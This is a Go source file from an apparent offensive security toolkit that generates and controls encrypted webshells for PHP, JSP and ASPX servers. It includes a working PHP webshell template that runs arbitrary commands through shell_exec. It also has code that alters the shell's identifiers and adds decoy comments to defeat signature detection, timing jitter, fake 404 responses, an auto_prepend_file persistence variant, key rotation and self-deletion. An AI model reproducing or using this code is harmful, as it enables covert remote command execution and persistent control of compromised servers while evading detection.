package scanner

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/subtle"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"regexp"
	"strings"
	"time"
)

// 加密 webshell 协议 v2。
//
// 设计目标（P0）：
//   - 密钥只存在于载荷源码中，不再随请求发送（旧版把 pwd=<密码> 和密文一起发，
//     任何被动抓包者都能直接解密，等于没有加密）。
//   - 命令与响应都走 AEAD：PHP/JSP 用 AES-256-GCM，ASPX(.NET Framework) 用
//     AES-256-CBC + HMAC-SHA256（Encrypt-then-MAC）。
//   - 时间戳参与认证（GCM 的 AAD / CBC 的 MAC 覆盖），并校验 ±300s 窗口；
//     令牌本身作为重放键，shell 侧维护 10 分钟重放缓存，重放一律 404。
//   - 请求载体随机：每次生成 shell 时随机选择随机命名的 HTTP 头或表单字段。
//   - 认证/解密/重放失败统一返回 404 伪装页，不做任何可区分的错误提示。
//   - 支持密钥轮换：旧的密钥发 R 操作，shell 将新密钥写入旁路文件（PHP 还会
//     尝试就地改写自身源码），后续请求使用新密钥。
//   - Windows/Linux 双栈：PHP/JSP/ASPX 均按目标 OS 选择 cmd.exe /c 或 /bin/sh -c。

const (
	ShellProtocolLegacy = "legacy"
	ShellProtocolV2     = "v2"

	shellV2Version     byte = 0x02
	shellV2GCMHeader        = 1 + 12 + 8
	shellV2CBCHeader        = 1 + 16 + 8
	shellV2GCMOverhead      = 16
	shellV2MACTagLen        = 32
	shellV2MaxSkew          = 5 * time.Minute
	shellV2AAD              = "jingwei-webshell-v2"
)

// ShellCryptoMode selects the AEAD construction used by a v2 payload. PHP and
// JSP have native AES-GCM; ASPX targets classic .NET Framework where AES-GCM is
// not universally available, so it uses AES-CBC + HMAC-SHA256.
type ShellCryptoMode string

const (
	ShellCryptoGCM     ShellCryptoMode = "gcm"
	ShellCryptoCBCHMAC ShellCryptoMode = "cbc-hmac"
)

func ShellCryptoModeForType(shellType string) ShellCryptoMode {
	if strings.EqualFold(strings.TrimSpace(shellType), "aspx") {
		return ShellCryptoCBCHMAC
	}
	return ShellCryptoGCM
}

// GenerateShellKey returns a fresh 256-bit key.
func GenerateShellKey() ([]byte, error) {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return nil, fmt.Errorf("生成 webshell 密钥失败: %w", err)
	}
	return key, nil
}

// EncodeShellKey renders a key for storage/transport as unpadded base64url.
func EncodeShellKey(key []byte) string {
	return base64.RawURLEncoding.EncodeToString(key)
}

// DecodeShellKey accepts base64url (with or without padding) and standard
// base64 so keys survive manual edits/copies.
func DecodeShellKey(encoded string) ([]byte, error) {
	s := strings.TrimSpace(encoded)
	if s == "" {
		return nil, errors.New("webshell 密钥为空")
	}
	if raw, err := base64.RawURLEncoding.DecodeString(strings.TrimRight(s, "=")); err == nil && len(raw) == 32 {
		return raw, nil
	}
	if raw, err := base64.StdEncoding.DecodeString(s); err == nil && len(raw) == 32 {
		return raw, nil
	}
	return nil, errors.New("webshell 密钥格式无效（需要 32 字节的 base64url）")
}

const shellCarrierAlphabet = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789"

func randomShellString(n int) (string, error) {
	var b strings.Builder
	max := big.NewInt(int64(len(shellCarrierAlphabet)))
	for i := 0; i < n; i++ {
		idx, err := rand.Int(rand.Reader, max)
		if err != nil {
			return "", err
		}
		b.WriteByte(shellCarrierAlphabet[idx.Int64()])
	}
	return b.String(), nil
}

// GenerateShellCarrier returns a random request carrier: either a random HTTP
// header name ("X-...") or a random form parameter name. The shell payload has
// the same name baked in.
func GenerateShellCarrier() (string, error) {
	suffix, err := randomShellString(10)
	if err != nil {
		return "", fmt.Errorf("生成 webshell 载体失败: %w", err)
	}
	flip, err := rand.Int(rand.Reader, big.NewInt(2))
	if err != nil {
		return "", fmt.Errorf("生成 webshell 载体失败: %w", err)
	}
	if flip.Int64() == 0 {
		return "X-" + suffix, nil
	}
	return "jw_" + suffix, nil
}

var shellCarrierPattern = regexp.MustCompile(`^(X-[A-Za-z0-9]{6,24}|[a-z][A-Za-z0-9_]{5,24})$`)

const (
	// shellTokenHeaderMax keeps big tokens out of headers: Tomcat and common
	// nginx/Apache limits reject header lines beyond ~8 KiB, so file chunks
	// travel in the form body even for X- carriers.
	shellTokenHeaderMax = 4096
)

// GenerateShellPassword returns a strong random password for legacy shells.
// Legacy shells still send their password in the clear; this only removes the
// well-known default, it does not make the legacy protocol safe.
func GenerateShellPassword() (string, error) {
	s, err := randomShellString(24)
	if err != nil {
		return "", fmt.Errorf("生成 webshell 口令失败: %w", err)
	}
	return s, nil
}

func randomHex(n int) (string, error) {
	buf := make([]byte, n)
	if _, err := rand.Read(buf); err != nil {
		return "", err
	}
	return hex.EncodeToString(buf), nil
}

// polymorphShellTemplate randomizes every identifier in a template before the
// key/carrier are substituted. Identifier renaming happens first so a random
// carrier (which itself may start with "jw_") can never be mistaken for code.
// A random decoy comment shifts the file hash and breaks static signatures.
func polymorphShellTemplate(shellType, tmpl string) (string, error) {
	token, err := randomShellString(8)
	if err != nil {
		return "", err
	}
	decoy, err := randomHex(8)
	if err != nil {
		return "", err
	}
	switch shellType {
	case "jsp":
		upper := strings.ToUpper(token)
		tmpl = regexp.MustCompile(`\bJW`).ReplaceAllString(tmpl, "Q"+upper)
		tmpl = regexp.MustCompile(`\bjw`).ReplaceAllString(tmpl, "m"+strings.ToLower(token))
		tmpl = strings.Replace(tmpl, "<%!\n", "<%-- "+decoy+" --%>\n<%!\n", 1)
	case "aspx":
		upper := strings.ToUpper(token)
		tmpl = regexp.MustCompile(`\bJW`).ReplaceAllString(tmpl, "K"+upper)
		tmpl = strings.Replace(tmpl, "<script runat=\"server\">\n", "<script runat=\"server\">\n// "+decoy+"\n", 1)
	default:
		prefix := "p" + token
		tmpl = strings.ReplaceAll(tmpl, "$jw", "$"+prefix)
		tmpl = strings.ReplaceAll(tmpl, "jw_", prefix+"_")
		tmpl = strings.Replace(tmpl, "<?php\n", "<?php\n/* "+decoy+" */\n", 1)
	}
	return tmpl, nil
}

// randomShellPad returns a random alphanumeric padding field. Padding makes the
// request/response ciphertext length vary independently of the payload size.
func randomShellPad(max int) string {
	if max <= 0 {
		return ""
	}
	n, err := rand.Int(rand.Reader, big.NewInt(int64(max)))
	if err != nil {
		return ""
	}
	s, err := randomShellString(1 + int(n.Int64()))
	if err != nil {
		return ""
	}
	return s
}

// finalizeShellPayload records the SHA-256 of the deployable source so an
// operator can verify what actually landed on the target.
func finalizeShellPayload(p ShellPayload) ShellPayload {
	sum := sha256.Sum256([]byte(p.Content))
	p.SHA256 = hex.EncodeToString(sum[:])
	return p
}

func jwMAC(key []byte, label string) []byte {
	h := hmac.New(sha256.New, key)
	h.Write([]byte(label))
	return h.Sum(nil)
}

// sealShellToken encrypts one protocol message. The returned token is unpadded
// base64url over either:
//
//	GCM:     ver(1) | nonce(12) | ts(8) | ciphertext+tag
//	CBC-MAC: ver(1) | iv(16)    | ts(8) | ciphertext | hmac(32)
//
// The version/nonce/iv/timestamp header is authenticated: GCM uses it as AAD
// and CBC-HMAC includes it in the MAC. Tampering with the timestamp therefore
// breaks authentication instead of extending a captured request's life.
func sealShellToken(key []byte, mode ShellCryptoMode, plaintext []byte, now time.Time) (string, error) {
	if len(key) != 32 {
		return "", errors.New("webshell 密钥必须是 32 字节")
	}
	if now.IsZero() {
		now = time.Now()
	}
	ts := make([]byte, 8)
	binary.BigEndian.PutUint64(ts, uint64(now.Unix()))

	if mode == ShellCryptoCBCHMAC {
		iv := make([]byte, aes.BlockSize)
		if _, err := rand.Read(iv); err != nil {
			return "", err
		}
		encKey := jwMAC(key, shellV2AAD+"/enc")
		macKey := jwMAC(key, shellV2AAD+"/mac")
		block, err := aes.NewCipher(encKey)
		if err != nil {
			return "", err
		}
		padded := pkcs7Pad(plaintext, aes.BlockSize)
		ct := make([]byte, len(padded))
		cipher.NewCBCEncrypter(block, iv).CryptBlocks(ct, padded)
		header := make([]byte, 0, shellV2CBCHeader)
		header = append(header, shellV2Version)
		header = append(header, iv...)
		header = append(header, ts...)
		body := append(append(make([]byte, 0, len(header)+len(ct)), header...), ct...)
		h := hmac.New(sha256.New, macKey)
		h.Write(body)
		token := append(body, h.Sum(nil)...)
		return base64.RawURLEncoding.EncodeToString(token), nil
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", err
	}
	header := make([]byte, 0, shellV2GCMHeader)
	header = append(header, shellV2Version)
	header = append(header, nonce...)
	header = append(header, ts...)
	sealed := gcm.Seal(nil, nonce, plaintext, header)
	token := append(append(make([]byte, 0, len(header)+len(sealed)), header...), sealed...)
	return base64.RawURLEncoding.EncodeToString(token), nil
}

// openShellToken reverses sealShellToken after authenticating the header. The
// timestamp is checked after authentication so a forged clock cannot bypass it.
func openShellToken(key []byte, mode ShellCryptoMode, token string, now time.Time) ([]byte, error) {
	if len(key) != 32 {
		return nil, errors.New("webshell 密钥必须是 32 字节")
	}
	if now.IsZero() {
		now = time.Now()
	}
	raw, err := base64.RawURLEncoding.DecodeString(strings.TrimSpace(token))
	if err != nil {
		return nil, errors.New("令牌不是合法的 base64url")
	}
	if len(raw) < 1 || raw[0] != shellV2Version {
		return nil, errors.New("令牌版本不匹配")
	}

	if mode == ShellCryptoCBCHMAC {
		if len(raw) < shellV2CBCHeader+shellV2MACTagLen+aes.BlockSize {
			return nil, errors.New("令牌长度不足")
		}
		body := raw[:len(raw)-shellV2MACTagLen]
		tag := raw[len(raw)-shellV2MACTagLen:]
		macKey := jwMAC(key, shellV2AAD+"/mac")
		h := hmac.New(sha256.New, macKey)
		h.Write(body)
		if subtle.ConstantTimeCompare(tag, h.Sum(nil)) != 1 {
			return nil, errors.New("令牌认证失败")
		}
		encKey := jwMAC(key, shellV2AAD+"/enc")
		block, err := aes.NewCipher(encKey)
		if err != nil {
			return nil, err
		}
		iv := body[1:17]
		if len(body) < shellV2CBCHeader+aes.BlockSize {
			return nil, errors.New("令牌长度不足")
		}
		ct := body[shellV2CBCHeader:]
		if len(ct)%aes.BlockSize != 0 {
			return nil, errors.New("密文长度非法")
		}
		pt := make([]byte, len(ct))
		cipher.NewCBCDecrypter(block, iv).CryptBlocks(pt, ct)
		pt = pkcs7Unpad(pt, aes.BlockSize)
		if err := checkShellTimestamp(body[17:25], now); err != nil {
			return nil, err
		}
		return pt, nil
	}

	if len(raw) < shellV2GCMHeader+shellV2GCMOverhead {
		return nil, errors.New("令牌长度不足")
	}
	header := raw[:shellV2GCMHeader]
	nonce := header[1:13]
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	pt, err := gcm.Open(nil, nonce, raw[shellV2GCMHeader:], header)
	if err != nil {
		return nil, errors.New("令牌认证失败")
	}
	if err := checkShellTimestamp(header[13:21], now); err != nil {
		return nil, err
	}
	return pt, nil
}

func checkShellTimestamp(raw []byte, now time.Time) error {
	if len(raw) != 8 {
		return errors.New("时间戳长度非法")
	}
	ts := int64(binary.BigEndian.Uint64(raw))
	diff := now.Unix() - ts
	if diff < 0 {
		diff = -diff
	}
	if time.Duration(diff)*time.Second > shellV2MaxSkew {
		return errors.New("令牌时间戳超出允许窗口")
	}
	return nil
}

func pkcs7Pad(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	pad := make([]byte, padding)
	for i := range pad {
		pad[i] = byte(padding)
	}
	return append(append([]byte{}, data...), pad...)
}

func pkcs7Unpad(data []byte, blockSize int) []byte {
	if len(data) == 0 || len(data)%blockSize != 0 {
		return data
	}
	padding := int(data[len(data)-1])
	if padding <= 0 || padding > blockSize || padding > len(data) {
		return data
	}
	for _, b := range data[len(data)-padding:] {
		if int(b) != padding {
			return data
		}
	}
	return data[:len(data)-padding]
}

func shellWireOp(op byte, payload []byte) []byte {
	return []byte(string(op) + "|" + base64.RawURLEncoding.EncodeToString(payload) + "|" + randomShellPad(40))
}

func shellWirePing() []byte {
	return []byte("P|" + randomShellPad(24))
}

func shellWireRotate(newKey []byte) []byte {
	return shellWireOp('R', newKey)
}

func shellWireDelete() []byte {
	return shellWireOp('D', nil)
}

// Self-delete acknowledgements. The marker deliberately avoids a leading word
// "JW"/"jw" so the polymorphic renamer (which rewrites those prefixes in
// JSP/ASPX/PHP templates) leaves the literal intact.
const (
	ShellSelfDeleteOK     = "__JWDEL_OK__"
	ShellSelfDeleteFailed = "__JWDEL_FAIL__"
)

// DeleteShellSelf asks a v2 shell to unlink its own file and key sidecar. It
// only proves the shell *tried*; call VerifyShellRemoved afterwards to confirm
// the endpoint no longer speaks the protocol (404 or marker gone).
func DeleteShellSelf(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload) (string, error) {
	if p.Protocol != ShellProtocolV2 {
		return "", errors.New("只有加密 v2 webshell 支持自删除")
	}
	req, err := p.v2Request(shellURL, shellWireDelete())
	if err != nil {
		return "", err
	}
	resp := c.Do(ctx, req)
	if resp.Error != "" {
		return "", resp.transportErr()
	}
	if resp.StatusCode >= 400 {
		return "", fmt.Errorf("shell 返回 HTTP %d，自删除请求被拒绝", resp.StatusCode)
	}
	out, err := decodeShellResponse(p, resp.Body)
	if err != nil {
		return "", fmt.Errorf("自删除回执无效: %v", err)
	}
	return strings.TrimSpace(out), nil
}

// VerifyShellRemoved treats a shell as gone when the protocol probe fails and
// either the URL returns 404/410 or the response no longer carries a valid
// protocol reply. Ambiguous responses (403, 5xx, transport errors) are not
// counted as removed.
func VerifyShellRemoved(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload) (bool, string) {
	alive, note := CheckShellAlive(ctx, c, shellURL, p)
	if alive {
		return false, "shell 仍响应协议请求"
	}
	resp := c.Do(ctx, DeepRequest{Method: http.MethodGet, URL: shellURL})
	switch {
	case resp.Error != "":
		return false, "复核请求失败：" + resp.Error + "（协议探测：" + note + "）"
	case resp.StatusCode == http.StatusNotFound || resp.StatusCode == http.StatusGone:
		return true, fmt.Sprintf("HTTP %d，协议请求已被拒绝", resp.StatusCode)
	case resp.StatusCode >= 200 && resp.StatusCode < 400:
		if _, err := decodeShellResponse(p, resp.Body); err != nil {
			return true, fmt.Sprintf("HTTP %d，响应中无协议标记", resp.StatusCode)
		}
		return false, "响应仍包含有效协议回执"
	}
	return false, fmt.Sprintf("HTTP %d，无法确认已删除", resp.StatusCode)
}

func shellWireExec(command string) []byte {
	return shellWireOp('E', []byte(command))
}

const (
	shellResponseGzipThreshold = 256
	shellResponseMaxBytes      = 32 << 20
)

// shellResponsePlain renders the plaintext the deployed shell encrypts:
//
//	OK|<flag>|<base64url data>|<random padding>
//
// flag "1" means the data is gzip-compressed. Decoders also accept the older
// "OK|<base64url data>" form so a rotation or rolling upgrade stays compatible.
func shellResponsePlain(output []byte) string {
	flag := "0"
	data := output
	if len(output) >= shellResponseGzipThreshold {
		var buf bytes.Buffer
		zw := gzip.NewWriter(&buf)
		if _, err := zw.Write(output); err == nil && zw.Close() == nil {
			flag = "1"
			data = buf.Bytes()
		}
	}
	return "OK|" + flag + "|" + base64.RawURLEncoding.EncodeToString(data) + "|" + randomShellPad(16)
}

// shellJitter randomizes the request cadence slightly so a sequence of
// operations does not present a machine-perfect timing signature.
func shellJitter() {
	n, err := rand.Int(rand.Reader, big.NewInt(50))
	if err != nil {
		return
	}
	time.Sleep((10 + time.Duration(n.Int64())) * time.Millisecond)
}

// buildShellPayloadV2 renders a keyed, AEAD-protected shell for one of
// php/jsp/aspx. The key never appears in requests; only in the deployed file.
func buildShellPayloadV2(shellType string, key []byte, carrier string) (ShellPayload, error) {
	shellType = strings.ToLower(strings.TrimSpace(shellType))
	if shellType != "php" && shellType != "jsp" && shellType != "aspx" {
		return ShellPayload{}, fmt.Errorf("不支持的加密 shell 类型: %s", shellType)
	}
	if len(key) != 32 {
		return ShellPayload{}, errors.New("webshell 密钥必须是 32 字节")
	}
	carrier = strings.TrimSpace(carrier)
	if !shellCarrierPattern.MatchString(carrier) {
		return ShellPayload{}, errors.New("webshell 载体名称无效")
	}
	build, err := randomHex(8)
	if err != nil {
		return ShellPayload{}, err
	}
	repl := strings.NewReplacer(
		"{{KEY}}", base64.StdEncoding.EncodeToString(key),
		"{{CARRIER}}", carrier,
		"{{BUILD}}", build,
	)
	var tmpl string
	switch shellType {
	case "jsp":
		tmpl = shellV2JSPTemplate
	case "aspx":
		tmpl = shellV2ASPXTemplate
	default:
		tmpl = shellV2PHPTemplate
	}
	tmpl = strings.ReplaceAll(tmpl, "{{PHP_FILE_SUPPORT}}", shellV2PHPFileSupport)
	tmpl, err = polymorphShellTemplate(shellType, tmpl)
	if err != nil {
		return ShellPayload{}, err
	}
	content := repl.Replace(tmpl)
	sum := sha256.Sum256([]byte(content))
	p := ShellPayload{
		Type:       shellType,
		Protocol:   ShellProtocolV2,
		Key:        append([]byte{}, key...),
		Carrier:    carrier,
		KeyVersion: 1,
		Filename:   "shell." + shellType,
		Content:    content,
		Marker:     "Not Found",
		SHA256:     hex.EncodeToString(sum[:]),
		Build:      build,
	}
	return p, nil
}

// BuildShellPayloadV2 is the exported builder used by the server layer.
func BuildShellPayloadV2(shellType string, key []byte, carrier string) (ShellPayload, error) {
	return buildShellPayloadV2(shellType, key, carrier)
}

// BuildPHPSemiPersistPayloadV2 renders the auto_prepend_file variant. It speaks
// the same v2 protocol, but requests without a valid token return to the
// originally requested script instead of answering 404, so it can sit in front
// of every PHP request without breaking the site.
func BuildPHPSemiPersistPayloadV2(key []byte, carrier string) (ShellPayload, error) {
	if len(key) != 32 {
		return ShellPayload{}, errors.New("webshell 密钥必须是 32 字节")
	}
	carrier = strings.TrimSpace(carrier)
	if !shellCarrierPattern.MatchString(carrier) {
		return ShellPayload{}, errors.New("webshell 载体名称无效")
	}
	build, err := randomHex(8)
	if err != nil {
		return ShellPayload{}, err
	}
	repl := strings.NewReplacer(
		"{{KEY}}", base64.StdEncoding.EncodeToString(key),
		"{{CARRIER}}", carrier,
		"{{BUILD}}", build,
	)
	tmpl := strings.ReplaceAll(shellV2PHPPersistTemplate, "{{PHP_FILE_SUPPORT}}", shellV2PHPFileSupport)
	tmpl, err = polymorphShellTemplate("php", tmpl)
	if err != nil {
		return ShellPayload{}, err
	}
	content := repl.Replace(tmpl)
	sum := sha256.Sum256([]byte(content))
	return ShellPayload{
		Type:       "php",
		Protocol:   ShellProtocolV2,
		Key:        append([]byte{}, key...),
		Carrier:    carrier,
		KeyVersion: 1,
		Filename:   "prepend.php",
		Content:    content,
		SHA256:     hex.EncodeToString(sum[:]),
		Build:      build,
	}, nil
}

func (p ShellPayload) v2Request(shellURL string, wire []byte) (DeepRequest, error) {
	if len(p.Key) != 32 {
		return DeepRequest{}, errors.New("加密 webshell 缺少密钥")
	}
	if !shellCarrierPattern.MatchString(p.Carrier) {
		return DeepRequest{}, errors.New("加密 webshell 载体无效")
	}
	shellJitter()
	token, err := sealShellToken(p.Key, ShellCryptoModeForType(p.Type), wire, time.Now())
	if err != nil {
		return DeepRequest{}, err
	}
	req := DeepRequest{Method: "POST", URL: shellURL}
	if strings.HasPrefix(p.Carrier, "X-") && len(token) <= shellTokenHeaderMax {
		req.Headers = map[string]string{p.Carrier: token}
		return req, nil
	}
	req.Body = p.Carrier + "=" + token
	req.BodyType = "form"
	return req, nil
}

var shellResponseTokenPattern = regexp.MustCompile(`[A-Za-z0-9_-]{40,}`)

// decodeShellResponse finds and decrypts the v2 token in a response body. The
// token may be surrounded by noise (PHP notices, WAF pages) so candidates are
// tried longest-first.
func decodeShellResponse(p ShellPayload, body string) (string, error) {
	if len(p.Key) != 32 {
		return "", errors.New("加密 webshell 缺少密钥")
	}
	mode := ShellCryptoModeForType(p.Type)
	candidates := []string{strings.TrimSpace(body)}
	seen := map[string]bool{}
	for _, m := range shellResponseTokenPattern.FindAllString(body, -1) {
		if !seen[m] {
			candidates = append(candidates, m)
			seen[m] = true
		}
	}
	var lastErr error
	for _, c := range candidates {
		if c == "" {
			continue
		}
		pt, err := openShellToken(p.Key, mode, c, time.Now())
		if err != nil {
			lastErr = err
			continue
		}
		if len(pt) < 3 || string(pt[:3]) != "OK|" {
			lastErr = errors.New("shell 响应语义异常")
			continue
		}
		rest := string(pt[3:])
		if flag, tail, ok := strings.Cut(rest, "|"); ok && (flag == "0" || flag == "1") {
			encoded := strings.SplitN(tail, "|", 2)[0]
			if encoded == "" {
				if flag == "0" {
					return "", nil
				}
				lastErr = errors.New("压缩响应缺少数据")
				continue
			}
			data, derr := base64.RawURLEncoding.DecodeString(encoded)
			if derr != nil {
				lastErr = derr
				continue
			}
			if flag == "1" {
				zr, zerr := gzip.NewReader(bytes.NewReader(data))
				if zerr != nil {
					lastErr = zerr
					continue
				}
				out, rerr := io.ReadAll(io.LimitReader(zr, shellResponseMaxBytes))
				_ = zr.Close()
				if rerr != nil {
					lastErr = rerr
					continue
				}
				data = out
			}
			return string(data), nil
		}
		enc := rest
		if enc == "" {
			return "", nil
		}
		out, err := base64.RawURLEncoding.DecodeString(enc)
		if err != nil {
			lastErr = err
			continue
		}
		return string(out), nil
	}
	if lastErr == nil {
		lastErr = errors.New("响应中没有可解密的令牌")
	}
	return "", fmt.Errorf("加密 shell 响应解析失败：%v（可能被 WAF 拦截、shell 已失效或密钥不匹配）", lastErr)
}

func runShellCommandV2(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload, command string) (string, error) {
	req, err := p.v2Request(shellURL, shellWireExec(command))
	if err != nil {
		return "", err
	}
	resp := c.Do(ctx, req)
	if resp.Error != "" {
		return "", resp.transportErr()
	}
	if resp.StatusCode >= 400 {
		return "", fmt.Errorf("加密 shell 返回 HTTP %d（认证失败、重放或 shell 已失效）", resp.StatusCode)
	}
	return decodeShellResponse(p, resp.Body)
}

func checkShellAliveV2(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload) (bool, string) {
	req, err := p.v2Request(shellURL, shellWirePing())
	if err != nil {
		return false, err.Error()
	}
	resp := c.Do(ctx, req)
	if resp.Error != "" {
		return false, resp.Error
	}
	if resp.StatusCode >= 400 {
		return false, fmt.Sprintf("HTTP %d（认证失败或 shell 已失效）", resp.StatusCode)
	}
	if _, err := decodeShellResponse(p, resp.Body); err != nil {
		return false, err.Error()
	}
	return true, "加密通道验证通过"
}

// RotateShellKey asks the deployed shell to switch to newKey. The request is
// authenticated with the old key; the ack is encrypted with the new key, which
// proves the shell stored it.
func RotateShellKey(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload, newKey []byte) error {
	if p.Protocol != ShellProtocolV2 {
		return errors.New("只有加密 v2 webshell 支持密钥轮换")
	}
	if len(newKey) != 32 {
		return errors.New("新密钥必须是 32 字节")
	}
	req, err := p.v2Request(shellURL, shellWireRotate(newKey))
	if err != nil {
		return err
	}
	resp := c.Do(ctx, req)
	if resp.Error != "" {
		return resp.transportErr()
	}
	if resp.StatusCode >= 400 {
		return fmt.Errorf("shell 返回 HTTP %d，密钥轮换失败", resp.StatusCode)
	}
	rotated := p
	rotated.Key = append([]byte{}, newKey...)
	if _, err := decodeShellResponse(rotated, resp.Body); err != nil {
		return fmt.Errorf("新密钥回执验证失败: %v", err)
	}
	return nil
}

const shellV2PHPTemplate = `<?php
error_reporting(0);
@set_time_limit(0);
$jw0 = base64_decode('{{KEY}}');
$jwC = '{{CARRIER}}';
$jwB = '{{BUILD}}';
$jwDir = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR);
$jwReplay = $jwDir . DIRECTORY_SEPARATOR . '.' . $jwB . '.r';
$jwOverride = $jwDir . DIRECTORY_SEPARATOR . '.' . $jwB . '.k';
function jw_b64d($s) { $s = strtr($s, '-_', '+/'); $r = strlen($s) % 4; if ($r) { $s .= str_repeat('=', $r == 1 ? 3 : 4 - $r); } return base64_decode($s, true); }
function jw_b64e($s) { return rtrim(strtr(base64_encode($s), '+/', '-_'), '='); }
function jw_rnd($n) { if (function_exists('random_bytes')) { return random_bytes($n); } return openssl_random_pseudo_bytes($n); }
function jw_no() { http_response_code(404); header('Content-Type: text/html; charset=utf-8'); echo '<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>'; exit; }
function jw_open($k, $t) { $r = jw_b64d($t); if ($r === false || strlen($r) < 37 || ord($r[0]) !== 2) { return false; } $h = substr($r, 0, 21); $n = substr($r, 1, 12); $ts = unpack('N2', substr($r, 13, 8)); $tsv = $ts[1] * 4294967296 + $ts[2]; if (abs(time() - $tsv) > 300) { return false; } $ct = substr($r, 21); $tag = substr($ct, -16); $ct = substr($ct, 0, -16); $p = openssl_decrypt($ct, 'aes-256-gcm', $k, OPENSSL_RAW_DATA, $n, $tag, $h); if ($p === false) { return false; } return $p; }
function jw_seal($k, $p) { $n = jw_rnd(12); $h = "\x02" . $n . pack('N2', 0, time()); $tag = ''; $ct = openssl_encrypt($p, 'aes-256-gcm', $k, OPENSSL_RAW_DATA, $n, $tag, $h, 16); if ($ct === false) { return ''; } return jw_b64e($h . $ct . $tag); }
function jw_arg($p) { $a = explode('|', $p, 3); if (count($a) < 2) { return false; } return jw_b64d($a[1]); }
function jw_reply($k, $out) { $out = (string)$out; $f = '0'; if (strlen($out) >= 256 && function_exists('gzencode')) { $z = gzencode($out, 6); if ($z !== false) { $out = $z; $f = '1'; } } $d = jw_b64e($out); $pad = jw_b64e(jw_rnd(1 + (ord(jw_rnd(1)) % 24))); echo jw_seal($k, 'OK|' . $f . '|' . $d . '|' . $pad); }
function jw_seen($path, $token) { $fp = @fopen($path, 'c+'); if (!$fp) { return true; } if (!flock($fp, LOCK_EX)) { fclose($fp); return true; } $now = time(); $keep = array(); $data = stream_get_contents($fp); foreach (explode("\n", (string)$data) as $line) { $parts = explode(' ', trim($line)); if (count($parts) === 2 && $now - (int)$parts[1] < 600) { $keep[$parts[0]] = (int)$parts[1]; } } if (isset($keep[$token])) { flock($fp, LOCK_UN); fclose($fp); return true; } $keep[$token] = $now; $out = ''; foreach ($keep as $kk => $tt) { $out .= $kk . ' ' . $tt . "\n"; } ftruncate($fp, 0); rewind($fp); fwrite($fp, $out); fflush($fp); flock($fp, LOCK_UN); fclose($fp); return false; }
function jw_info() { $u = ''; if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) { $pw = @posix_getpwuid(@posix_geteuid()); if (is_array($pw) && isset($pw['name'])) { $u = (string)$pw['name']; } } if ($u === '') { $u = (string)@get_current_user(); } $j = @json_encode(array('os' => PHP_OS, 'sapi' => PHP_SAPI, 'php' => PHP_VERSION, 'file' => __FILE__, 'dir' => __DIR__, 'document_root' => isset($_SERVER['DOCUMENT_ROOT']) ? (string)$_SERVER['DOCUMENT_ROOT'] : '', 'script' => isset($_SERVER['SCRIPT_FILENAME']) ? (string)$_SERVER['SCRIPT_FILENAME'] : '', 'user_ini_filename' => (string)@ini_get('user_ini.filename'), 'user_ini_cache_ttl' => (int)@ini_get('user_ini.cache_ttl'), 'auto_prepend_file' => (string)@ini_get('auto_prepend_file'), 'open_basedir' => (string)@ini_get('open_basedir'), 'disable_functions' => (string)@ini_get('disable_functions'), 'server' => isset($_SERVER['SERVER_SOFTWARE']) ? (string)$_SERVER['SERVER_SOFTWARE'] : '', 'user' => $u, 'cwd' => (string)@getcwd(), 'tmp' => (string)@sys_get_temp_dir())); return $j === false ? '{}' : $j; }
{{PHP_FILE_SUPPORT}}
$jwK = $jw0;
if (is_file($jwOverride)) { $jwRaw = @file_get_contents($jwOverride); if ($jwRaw !== false) { $jwNew = base64_decode(trim($jwRaw), true); if ($jwNew !== false && strlen($jwNew) === 32) { $jwK = $jwNew; } } }
$jwToken = '';
if (strpos($jwC, 'X-') === 0) { $jwH = 'HTTP_' . strtoupper(str_replace('-', '_', $jwC)); if (isset($_SERVER[$jwH])) { $jwToken = $_SERVER[$jwH]; } }
if (!is_string($jwToken) || $jwToken === '') { if (isset($_POST[$jwC])) { $jwToken = $_POST[$jwC]; } elseif (isset($_GET[$jwC])) { $jwToken = $_GET[$jwC]; } }
if (!is_string($jwToken) || $jwToken === '') { jw_no(); }
$jwP = jw_open($jwK, $jwToken);
if ($jwP === false || jw_seen($jwReplay, $jwToken)) { jw_no(); }
$jwOp = substr($jwP, 0, 1);
if ($jwOp === 'P') { jw_reply($jwK, ''); exit; }
if ($jwOp === 'I') { jw_reply($jwK, jw_info()); exit; }
if ($jwOp === 'E') { $jwCmd = jw_arg($jwP); if ($jwCmd === false) { jw_no(); } $jwFull = DIRECTORY_SEPARATOR === '\\' ? 'cmd.exe /c ' . $jwCmd . ' 2>&1' : $jwCmd . ' 2>&1'; $jwOut = @shell_exec($jwFull); if ($jwOut === null) { $jwOut = ''; } jw_reply($jwK, $jwOut); exit; }
if ($jwOp === 'F') { jw_fs_dispatch($jwK, $jwP); exit; }
if ($jwOp === 'D') { $jwOk = @unlink(__FILE__); @unlink($jwOverride); @unlink($jwReplay); jw_reply($jwK, $jwOk ? '__JWDEL_OK__' : '__JWDEL_FAIL__'); exit; }
